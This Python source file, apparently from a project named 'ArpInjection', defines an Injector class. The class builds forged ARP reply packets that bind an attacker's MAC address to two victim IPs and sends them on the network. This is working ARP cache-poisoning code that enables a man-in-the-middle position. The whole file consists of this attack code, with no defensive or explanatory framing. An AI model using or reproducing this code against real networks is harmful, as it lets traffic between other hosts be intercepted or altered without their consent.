# TODO: Get attacked macs via ARP
from ArpInjection.PacketBuilder import PacketBuilder
from ArpInjection.addresses_helper import AddressesHelper
from ArpInjection.network_device import NetworkDevice


class Injector(object):
    def __init__(self, network_device, addresses_helper, packet_builder):
        assert isinstance(network_device, NetworkDevice)
        self.network_device = network_device
        self.addresses_helper = addresses_helper
        assert isinstance(packet_builder, PacketBuilder)
        self.packet_builder = packet_builder

    def __get_arp_reply(self, sha, spa, tha, tpa):
        arp_reply_type = 2
        return self.packet_builder.get_arp(sha, spa, tha, tpa, arp_reply_type)

    def inject_entry_to_arp_table(self, attacker_mac_to_inject, first_ip, second_ip):
        arp_reply_1 = self.__get_arp_reply(attacker_mac_to_inject,
                                           first_ip,
                                           AddressesHelper.BROADCAST,
                                           second_ip)
        arp_reply_2 = self.__get_arp_reply(attacker_mac_to_inject,
                                           second_ip,
                                           AddressesHelper.BROADCAST,
                                           first_ip)
        self.network_device.send_packet(arp_reply_1.get_packet())
        self.network_device.send_packet(arp_reply_2.get_packet())
